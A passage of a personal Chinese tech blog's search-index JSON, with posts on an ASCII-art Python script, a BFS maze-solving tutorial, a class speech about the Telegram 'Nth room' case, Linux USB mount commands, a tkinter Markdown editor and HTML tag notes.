0;&#125;","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"}]},{"title":"用Python编写一个能将图片转换为字符画的程序","slug":"用Python编写一个能将图片转换为字符画的程序","date":"2021-04-09T16:46:04.299Z","updated":"2020-11-10T02:54:55.042Z","comments":true,"path":"2021/04/10/用Python编写一个能将图片转换为字符画的程序/","link":"","permalink":"http://uniqueland.top/2021/04/10/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E8%83%BD%E5%B0%86%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E7%94%BB%E7%9A%84%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081\\# -*- coding=utf-8 -*- from PIL import Image import argparse #命令行输入参数处理 parser = argparse.ArgumentParser() parser.add_argument(&#x27;file&#x27;) #输入文件parser.add_argument(&#x27;-o&#x27;, &#x27;--output&#x27;) #输出文件 parser.add_argument(&#x27;--width&#x27;, type = int, default = 80) #输出字符画宽 parser.add_argument(&#x27;--height&#x27;, type = int, default = 80) #输出字符画高 #获取参数 args = parser.parse_args() IMG = args.fileWIDTH = args.width HEIGHT = args.height OUTPUT = args.output ascii_char = list(&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\\&quot;^&#x27;. &quot;) # 将256灰度映射到70个字符上 def get_char(r,g,b,alpha = 256): ​ if alpha == 0: ​ return &#x27; &#x27; ​ length = len(ascii_char) ​ gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b) ​ unit = (256.0 + 1)/length ​ return ascii_char[int(gray/unit)] if __name__ == &#x27;__main__&#x27;: ​ im = Image.open(IMG) ​ im = im.resize((WIDTH,HEIGHT), Image.NEAREST) ​ txt = &quot;&quot; ​ for i in range(HEIGHT): ​ for j in range(WIDTH): ​ txt += get_char(*im.getpixel((j,i))) ​ txt += &#x27;\\n&#x27; ​ print(txt) #字符画输出到文件 ​ if OUTPUT: ​ with open(OUTPUT,&#x27;w&#x27;) as f: ​ f.write(txt) ​ else: ​ with open(&quot;output.txt&quot;,&#x27;w&#x27;) as f: ​ f.write(txt)","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"人工智能入门-查找","slug":"人工智能入门-搜索","date":"2021-04-09T16:46:04.298Z","updated":"2021-05-02T06:00:22.634Z","comments":true,"path":"2021/04/10/人工智能入门-搜索/","link":"","permalink":"http://uniqueland.top/2021/04/10/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8-%E6%90%9C%E7%B4%A2/","excerpt":"概述 众所周知，人工智能在近些年十分火爆，在各个领域的应用也是十分广泛，其中一个领域就是导航。","text":"概述 众所周知，人工智能在近些年十分火爆，在各个领域的应用也是十分广泛，其中一个领域就是导航。 也许有人会说，导航不就是电子地图嘛？和人工智能有什么关系？但其实在导航中人工智能发挥了很重要的作用。“条条大路通罗马”，为什么导航会向你推荐这条路而不推荐另一条路？这其中就涉及到了人工智能中的搜索算法。 在搜索中，往往有初始状态(initial states)、目标状态(goal states)，而人工智能所做的，就是在众多情形中，找到众多解决方法的最优解，其中会涉及到循环和迭代，假如我们现在有一个初始状态，我们要怎样达到目标状态呢？ 概念介绍 在这之前需要先了解一些概念： 动作：通常是接受状态的函数，返回在此状态中应该做出的决策 迁移模型：通常是接受状态和动作的函数，返回在此状态下做出此种决策后的新状态 节点：数据结构，用来记录状态，父节点，动作和路径成本 边界：数据结构，用来区分已探索的部分和未探索的部分 算法讨论 在了解了相关概念之后，我们开始讨论算法： 首先将初始状态放入边界，然后进入循环 如果边界为空，则无解 从边界中移去一个节点 如果此节点包含目标状态，则追踪父节点，然后返回解决方案 扩张节点并将其加入边界 下面举个例子： 假设我们现在的要求是找到从A到E的路径 第一步我们将A（初始状态）放入边界，进入循环 因为A不是目标状态，将A移出边界并将B加入边界 因为B不是目标状态，将B移出边界并将C和D加入边界 因为C不是目标状态，将C移出边界并将E加入边界 因为E是目标状态，所以我们返回从A到E的路径，循环结束 至此，我们就解决了一个非常简单的路径搜索问题，当然，这个算法还存在着许多问题，比如：如何确保算法不会重新检查当前状态的父节点？如果重复检查父节点，那么程序将进入无限死循环。解决方法很简单，使用一个数据结构来储存已检查过的节点，然后在每次检查节点时遍历此数据结构，如果存在与之相同的节点则不检查。 那么在实际情况下是怎么样的呢？ 实战 下面进入实战环节： 情境：你现在有一张迷宫地图，起点为A，终点为B，需要编写程序令计算机自行找出离开迷宫的路并显示在屏幕上 12345678910111213141516171819# # # # # B # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # A # # # # 我们将这个待实现的程序按照之前所讨论的分为几个部分： 如图所示，我们主要将程序分为三个部分： 首先是定义相关的变量，并且将初始状态放入边界； 然后进入循环： 第一步：检查边界的长度，如果等于0则说明无解 第二步：从边界中移去一个节点，并将此节点添加到表示已探索的数据结构 第三步：检查被移去的节点，如果此节点包含目标状态，则追踪其父节点，并返回路径 最后，我们使用一个循环来追踪完整的路径，并将其显示在屏幕上。 以下是根据思路实现的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495map1 = [[&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;]]# set the routemap1[9][0]=&#x27;A&#x27;map1[0][9]=&#x27;B&#x27;for i in range(10): map1[5][i] = &#x27; &#x27;for i in range(10): map1[i][5] = &#x27; &#x27;map1[9][1] = &#x27; &#x27;map1[9][2] = &#x27; &#x27;map1[9][3] = &#x27; &#x27;map1[9][4] = &#x27; &#x27;map1[0][6] = &#x27; &#x27;map1[0][7] = &#x27; &#x27;map1[0][8] = &#x27; &#x27;# print out the mapfor i in map1: for j in i: print(j,end=&#x27; &#x27;) print(&quot;\\n&quot;)class Unit: def __init__(self,c,p): x=c[0] y=c[1] self.x=x self.y=y self.up=(self.x,self.y+1) self.down=(self.x,self.y-1) self.left=(self.x-1,self.y) self.right=(self.x+1,self.y) self.directions = [self.up,self.down,self.left,self.right] self.parent = pstart=Unit((9,0),(0,0))goal=Unit((0,9),(-1,-1))def travel(map1,start): frontier = [] explored = [] current = Unit((start.x,start.y),start.parent) frontier.append(current) while True: if len(frontier) == 0: print(&quot;No result&quot;) break del(frontier[0]) explored.append(Unit((current.x,current.y),current.parent)) if current.x == goal.x and current.y == goal.y: print(&quot;\\nGot it!\\n&quot;) while current.parent != (0,0): for trace in explored: if trace.x == current.parent[0] and trace.y == current.parent[1]: if map1[current.x][current.y] == &#x27; &#x27;: map1[current.x][current.y] = &#x27;.&#x27; # print(current.x,current.y) current = trace for i in map1: for j in i: print(j,end=&#x27; &#x27;) print(&quot;\\n&quot;) break for i in current.directions: j=Unit((i[0],i[1]),(current.x,current.y)) # print((j.x,j.y),end=&#x27;,&#x27;) condition = 1 for x in explored: if x.x==j.x and x.y==j.y: condition = 0 if condition and j.x&gt;=0 and j.x&lt;=9 and j.y&gt;=0 and j.y&lt;=9 and map1[j.x][j.y] != &#x27;#&#x27;: frontier.append(Unit((i[0],i[1]),(current.x,current.y))) current = frontier[0] travel(map1,start) 在实现的过程中，我遇到了一些问题： 由于对Python中类的使用不熟练，导致代码中有关部分看起来很奇怪 在遍历当前节点周围的有效节点时，没有重新初始化节点，而是直接将当前节点周围有效节点的坐标加入边界，导致循环从第二次开始就无法进行，因为坐标没有“周围的有效节点”这个属性 在将以探索过的节点加入对应数据结构后，检查下一个节点是否在此数据结构时直接使用“==”，但是即使坐标相同的两个节点也可能不相等，原因是这两个节点存在于不同的地址，正确的做法是再遍历一遍存储以探索过的数据结构，直接比较此数据结构中节点的坐标值 在完成初步的实现后，处于对代码重构的要求，对代码做了相关的函数封装： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107map1 = [[&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;]]# set the routemap1[9][0]=&#x27;A&#x27;map1[0][9]=&#x27;B&#x27;for i in range(10): map1[5][i] = &#x27; &#x27;for i in range(10): map1[i][5] = &#x27; &#x27;map1[9][1] = &#x27; &#x27;map1[9][2] = &#x27; &#x27;map1[9][3] = &#x27; &#x27;map1[9][4] = &#x27; &#x27;map1[0][6] = &#x27; &#x27;map1[0][7] = &#x27; &#x27;map1[0][8] = &#x27; &#x27;# print out the mapdef map_show(map1): for i in map1: for j in i: print(j,end=&#x27; &#x27;) print(&quot;\\n&quot;)map_show(map1)class Unit: def __init__(self,c,p): x=c[0] y=c[1] self.x=x self.y=y self.up=(self.x,self.y+1) self.down=(self.x,self.y-1) self.left=(self.x-1,self.y) self.right=(self.x+1,self.y) self.directions = [self.up,self.down,self.left,self.right] self.parent = pstart=Unit((9,0),(0,0))goal=Unit((0,9),(-1,-1))def route_trace(current,explored): while current.parent != (0,0): for trace in explored: if trace.x == current.parent[0] and trace.y == current.parent[1]: if map1[current.x][current.y] == &#x27; &#x27;: map1[current.x][current.y] = &#x27;.&#x27; # print(current.x,current.y) current = tracedef action(frontier,explored,current): for i in current.directions: j=Unit((i[0],i[1]),(current.x,current.y)) # print((j.x,j.y),end=&#x27;,&#x27;) condition = 1 for x in explored: if x.x==j.x and x.y==j.y: condition = 0 if condition and j.x&gt;=0 and j.x&lt;=9 and j.y&gt;=0 and j.y&lt;=9 and map1[j.x][j.y] != &#x27;#&#x27;: frontier.append(Unit((i[0],i[1]),(current.x,current.y)))def travel(map1,start): frontier = [] explored = [] current = Unit((start.x,start.y),start.parent) frontier.append(current) while True: if len(frontier) == 0: print(&quot;No result&quot;) break del(frontier[0]) explored.append(Unit((current.x,current.y),current.parent)) if current.x == goal.x and current.y == goal.y: print(&quot;\\nGot it!\\n&quot;) route_trace(current,explored) map_show(map1) break action(frontier,explored,current) if len(frontier) == 0: print(&quot;No result&quot;) break current = frontier[0] travel(map1,start) 结果如下： 123456789101112131415161718192021222324252627282930313233343536373839404142# # # # # B # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # A # # # # Got it!# # # # # . . . . B # # # # # . # # # # # # # # # . # # # # # # # # # . # # # # # # # # # . # # # # . # # # # # . # # # # # # # # # . # # # # # # # # # . # # # # A . . . . . # # # # 现在，这个程序已经能够找出各种迷宫地图的解法了，也就是说，如果我们对地图进行修改，程序也能够正常运行并输出相应结果，比如，我们将地图的唯一道路“封死”，那么结果就会是“No result”，如下所示： 123456789101112131415161718192021# # # # # B # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # A # # # # # No result 至此，我们就完成了对此情境下相关代码的编写。 修改于2021.04.11","categories":[],"tags":[{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"},{"name":"AI","slug":"AI","permalink":"http://uniqueland.top/tags/AI/"}]},{"title":"来自班级组织演讲的一篇演讲稿","slug":"Speech","date":"2021-04-09T16:46:04.297Z","updated":"2020-11-09T06:00:08.000Z","comments":true,"path":"2021/04/10/Speech/","link":"","permalink":"http://uniqueland.top/2021/04/10/Speech/","excerpt":"正文地狱空荡荡 恶魔在人间 想必在座各位多少看过这句话，这就是我今天要说的有关Telegram N号房事件的一些东西；由于案情复杂，我就不再赘述，有兴趣的请自行百度主要人物介绍：","text":"正文地狱空荡荡 恶魔在人间 想必在座各位多少看过这句话，这就是我今天要说的有关Telegram N号房事件的一些东西；由于案情复杂，我就不再赘述，有兴趣的请自行百度主要人物介绍：赵主彬：现年25岁，信息通信专业，曾担任学报编辑部编辑。多次获得奖学金。3年内参加了50多次志愿活动。就是这么一个表面人畜无害的优秀学生，主导了这么一起事件。对此人进行分析，我们不难得出：平台用telegram，交易用比特币，说明罪犯反侦查意识高，思维敏捷，可以归类为高智商信息犯罪；内心自卑，但是外围性格特征表现为自负，因无法达到自身的高度预期郁不得志，因此可能存在社会偏见，有一定概率发展为反社会型人格；可能存在家庭暴力，且是父权家庭；社交能力较差，排斥甚至仇视女性，这点可以从他在被捕后的言论发表矢口不谈对女性的道歉这一点可以看出。 有的孩子是孩子，有的孩子是禽兽这十几年都塞了什么进脑子里人名不打码，马赛克做错了什么 就像这些评论所表述的一样，我也痛恨这些精虫上脑的东西。但是几乎一边倒的网络舆论显然有些问题：这26万人个个都罪该万死吗？考虑到涉案人数及案件的复杂程度，我个人觉得其中还是不乏被教唆的，受蒙骗的，甚至不明情况的。不是说强行洗白，而是我认为每个人看待事情都应该有自己的看法，有那种不被舆论大势所动摇的那种看法。大家是否看过这样一个比喻：韩国目前在运营的出租车大概有26万辆，这意味着在韩国的大街上，遇到N号房会员就像遇到出租车一样频繁。不知各位对这个比喻有什么看法在我看来，这是一种下意识的情景描绘，旨在放大案件涉及的范围，而这种情景描绘于我来看除了放大恐慌之外没有任何用处，那他们这么做的目的何在呢？要我说要不就是公众号博人眼球，要不就涉及到黑公关带节奏，由于这是一个国家级的案件，比起背后大到令人无法想象的黑灰产业链，我还是更倾向于前者。 最后，引用了几句某些公众号的评价作为我对此事的看法，话很粗，但理不粗：作为一个成年人，要学会克制，不该馋的不要馋。我知道现在是春天，但只有野狗才不分场合、不分对象，时刻想着交配。何况，野狗也只在春秋两季才发情 补充由于班级组织的演讲限时3分钟，所以我不得不把原本一千多字的演讲稿删为800多字，也因此缺失了很多事件的细节及个人的观点。–2020.05.07","categories":[],"tags":[]},{"title":"Linux下利用命令行对U盘和电脑中的文件进行操作","slug":"Operations between flash disk and linux os","date":"2021-04-09T16:46:04.296Z","updated":"2020-11-10T03:52:41.832Z","comments":true,"path":"2021/04/10/Operations between flash disk and linux os/","link":"","permalink":"http://uniqueland.top/2021/04/10/Operations%20between%20flash%20disk%20and%20linux%20os/","excerpt":"","text":"123456fdisk -l #查看接入设备名称mount /dev/sda1 /mnt #挂载U盘ls /mnt #查看U盘文件cp file directory #复制指定文件file至指定目录directoryls /mnt #再次查看U盘文件umount /mnt #卸载U盘 标题（可选）提示：若操作中出现错误，请查看权限是否正确，或在每次操作前加’sudo’cp后的文件和路径需带路径(个人推荐绝对路径)","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"Markdown_Editor V1.0","slug":"Markdown_Editor V1.0","date":"2021-04-09T16:46:04.295Z","updated":"2020-11-10T02:56:29.631Z","comments":true,"path":"2021/04/10/Markdown_Editor V1.0/","link":"","permalink":"http://uniqueland.top/2021/04/10/Markdown_Editor%20V1.0/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556\\# -*- coding=utf-8 -*- import tkinterimport osfrom tkinter import filedialogwin_size=&#x27;450x550&#x27;win = tkinter.Tk()win.geometry(win_size)win.title(&#x27;Markdown Editor V1.0 (hexo only)&#x27;)def processandsave(): contents = &#x27;---\\ntitle:&#x27; + title.get(&#x27;0.0&#x27;,&#x27;end&#x27;) + &#x27;tags:&#x27; + tags.get(&#x27;0.0&#x27;,&#x27;end&#x27;) + &#x27;---\\n&#x27; + content.get(&#x27;0.0&#x27;,&#x27;end&#x27;) filename = filedialog.asksaveasfilename() if filename is not None: with open(file=filename,mode=&#x27;w&#x27;) as file: file.write(str(contents)) title.delete(&#x27;0.0&#x27;,&#x27;end&#x27;) tags.delete(&#x27;0.0&#x27;,&#x27;end&#x27;) content.delete(&#x27;0.0&#x27;,&#x27;end&#x27;)def add_bash(): add_content=add_bash_text.get(&#x27;0.0&#x27;,&#x27;end&#x27;) add_content=add_content.rstrip() changing_content=&#x27;```bash\\n&#x27;+add_content+&#x27;\\n```\\n&#x27; content.insert(&#x27;end&#x27;,changing_content) add_bash_text.delete(&#x27;0.0&#x27;,&#x27;end&#x27;)label1=tkinter.Label(text=&#x27;标题&#x27;,padx=10,pady=10)label1.grid(row=0,column=0)title=tkinter.Text(width=40,height=2)title.grid(row=0,column=1,columnspan=2)label2=tkinter.Label(text=&#x27;标签&#x27;,padx=5,pady=5)label2.grid(row=1,column=0)tags=tkinter.Text(width=30,height=1)tags.grid(row=1,column=1)label3=tkinter.Label(text=&#x27;正文&#x27;,padx=5,pady=5)label3.grid(row=2,column=0)content=tkinter.Text(width=40,height=20)content.grid(row=2,column=1,rowspan=5)add_bash_button=tkinter.Button(win,text=&#x27;命令行&#x27;,command=add_bash)add_bash_button.grid(row=9,column=0)add_bash_text=tkinter.Text(width=40,height=5)add_bash_text.grid(row=9,column=1)save_button=tkinter.Button(win,text=&#x27;保存&#x27;,command=processandsave)save_button.grid(row=8,column=1)win.mainloop()","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"Thanksgiving","slug":"img_share","date":"2021-04-09T16:46:04.294Z","updated":"2020-11-28T16:15:08.320Z","comments":true,"path":"2021/04/10/img_share/","link":"","permalink":"http://uniqueland.top/2021/04/10/img_share/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"HTML笔记","slug":"HTML_notes","date":"2021-04-09T16:46:04.293Z","updated":"2021-01-18T15:02:48.534Z","comments":true,"path":"2021/04/10/HTML_notes/","link":"","permalink":"http://uniqueland.top/2021/04/10/HTML_notes/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980811 &lt;h1&gt; to &lt;/h6&gt;: 一到六号标题2 &lt;p&gt;段落&lt;/p&gt;3 &lt;body style=&quot;background-color:PowderBlue;&quot;&gt; &lt;p style=&quot;font-family:verdana;color:red&quot;&gt;对段落样式进行修改&lt;/p&gt; &lt;/body&gt;4 &lt;br /&gt;&lt;hr /&gt;&lt;!这是注释，前面的是换行和分割线&gt;5 &lt;b&gt;被加粗的内容&lt;/b&gt;6 &lt;strong&gt;被...加粗的内容...吧&lt;/strong&gt;7 &lt;big&gt;被加大的内容&lt;/big&gt;8 &lt;em&gt;被强调(加斜)的内容&lt;/em&gt;9 &lt;i&gt;被...意大利式加斜的内容&lt;/i&gt;10 &lt;small&gt;被减小的内容&lt;/small&gt;11 &lt;sub&gt;位于右下角的小字部分&lt;/sub&gt;12 &lt;sup&gt;位于右上角的小字部分&lt;/sup&gt;13 &lt;pre&gt;预格式文本(保留了空格和换行)&lt;/pre&gt;14 &lt;code&gt;用于&lt;/code&gt;,&lt;kbd&gt;显示&lt;/kbd&gt;,&lt;samp&gt;代码&lt;/samp&gt;,&lt;var&gt;这个加大加粗了一点&lt;/var&gt;15 &lt;address&gt;用于书写地址，其中记得手动添加换行标签&lt;/address&gt;16 &lt;abbr title=&quot;etcetera&quot;&gt;etc.&lt;/abbr&gt;17 &lt;acronym title=&quot;World Wide Web&quot;&gt;WWW&lt;/acronym&gt;18 &lt;bdo dir=&quot;rtl&quot;&gt;印打序倒&lt;/bdo&gt;19 &lt;blockquote&gt;块引用&lt;/blockquote&gt;,&lt;q&gt;短引用&lt;/q&gt;20 &lt;p&gt;你看&lt;del&gt;我被划掉了&lt;/del&gt;&lt;ins&gt;又被加下划线了&lt;/ins&gt;&lt;/p&gt;21 &lt;a name=&quot;tips&quot;&gt;基本的注意事项 - 有用的提示&lt;/a&gt; &lt;a href=&quot;#tips&quot;&gt;有用的提示&lt;/a&gt;22 &lt;img src=&quot;url&quot; width=xx height=xx align=xxx /&gt;23 &lt;table border=&quot;1&quot;&gt; &lt;tr&gt; &lt;th&gt;Heading&lt;/th&gt; &lt;th&gt;Another Heading&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 1, cell 1&lt;/td&gt; &lt;td&gt;row 1, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 2, cell 1&lt;/td&gt; &lt;td&gt;row 2, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;24 &lt;ul&gt;&lt;!unsorted list&gt; &lt;li&gt;Coffee&lt;/li&gt; &lt;li&gt;Milk&lt;/li&gt; &lt;/ul&gt;25 &lt;ol&gt;&lt;!ordered list&gt; &lt;li&gt;Coffee&lt;/li&gt; &lt;li&gt;Milk&lt;/li&gt; &lt;/ol&gt;26 &lt;dl&gt;&lt;!defined list&gt; &lt;dt&gt;Coffee&lt;/dt&gt; &lt;dd&gt;Black hot drink&lt;/dd&gt; &lt;dt&gt;Milk&lt;/dt&gt; &lt;dd&gt;White cold drink&lt;/dd&gt; &lt;/dl&gt;27 &lt;head&gt; &lt;style&gt; .cities &#123; background-color:black; color:white; margin:20px; padding:20px; &#125; &lt;/style&gt; &lt;/head&gt;28 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; span.red &#123;color:red;&#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;My &lt;span class=&quot;red&quot;&gt;Important&lt;/span&gt; Heading&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt;29 &lt;iframe src=&quot;demo_iframe.htm&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;30 &lt;body background=&quot;http://www.w3school.com.cn/clouds.gif&quot;&gt;31 &lt;script type=&quot;text/javascript&quot;&gt; document.write(&quot;Hello World!&quot;) &lt;/script&gt; &lt;noscript&gt;Your browser does not support JavaScript!&lt;/noscript&gt; Quick Search","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"0","slug":"0","date":"2020-03-22T09:06:28.000Z","updated":"2020-11-09T06:00:08.000Z","comments":true,"path":"2020/03/22/0/","link":"","permalink":"http://uniqueland.top/2020/03/22/0/","excerpt":"","text":"Hello,World！说人话 我终于有自己的网站啦 虽然只是部署在github上的先做个测试 下回在看看要弄啥peach..啊不…peace～～","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"},{"name":"Windows","slug":"Windows","permalink":"http://uniqueland.top/tags/Windows/"},{"name":"CyberSecurity","slug":"CyberSecurity","permalink":"http://uniqueland.top/tags/CyberSecurity/"},{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"},{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"},{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"},{"name":"tool","slug":"tool","permalink":"http://uniqueland.top/tags/tool/"},{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"},{"name":"linux","slug":"linux","permalink":"http://uniqueland.top/tags/linux/"},{"name":"other","slug":"other","permalink":"http://uniqueland.top/tags/other/"},{"name":"ctf、web","slug":"ctf、web","permalink":"http://uniqueland.top/tags/ctf%E3%80%81web/"},{"name":"CTF","slug":"CTF","permalink":"http://uniqueland.top/tags/CTF/"},{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"},{"name":"AI","slug":"AI","permalink":"http://uniqueland.top/tags/AI/"}]}